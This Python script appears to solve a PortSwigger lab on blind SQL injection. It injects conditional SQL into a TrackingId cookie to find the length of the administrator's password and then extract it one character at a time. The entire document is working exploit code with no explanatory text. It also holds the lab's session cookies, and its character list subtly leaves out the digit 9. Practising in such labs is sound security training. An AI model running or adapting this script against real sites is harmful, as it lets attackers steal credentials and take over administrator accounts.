#Blind SQL injection with conditional responses

import requests

session = requests.session()

#base request, got with Copy As Python-Requests extension on burp
burp0_url = "https://acf01fd11eee975fc091127700d50068.web-security-academy.net:443/"
burp0_cookies = {"TrackingId": "3e9tZakQKzMgvf2A", "session": "4whxTiOFtCMOCPnaUcKieU8kZ8MpSN38"}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://portswigger.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Connection": "close"}


#finding password length
pass_len = 1
flag = True

while flag:

    #finding password length
    burp0_cookies["TrackingId"] = "3e9tZakQKzMgvf2A' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>%s)='a" % (pass_len)
    response = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text
    #print(response)

    if "Welcome back!" not in response:
        flag = False
        print("pass_len : %d" % (pass_len))
    else:
        pass_len = pass_len + 1


#finding password
final_pass = ""

#lower case characters list
import string
char_list = list(string.ascii_lowercase)

#adding numbers to list
for i in range(0,9,1):
    char_list.append(i)

for index in range(1,pass_len+1):
    for char in char_list:
        #(index)th numbers of password
        burp0_cookies["TrackingId"] = "3e9tZakQKzMgvf2A' AND (SELECT SUBSTRING(password,%d,1) FROM users WHERE username='administrator')='%s" % (index,char)
        response = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text

        if "Welcome back!" in response:
            print("found: %d : %s" % (index,str(char)))
            final_pass = final_pass + str(char)

print(final_pass)
print(len(final_pass))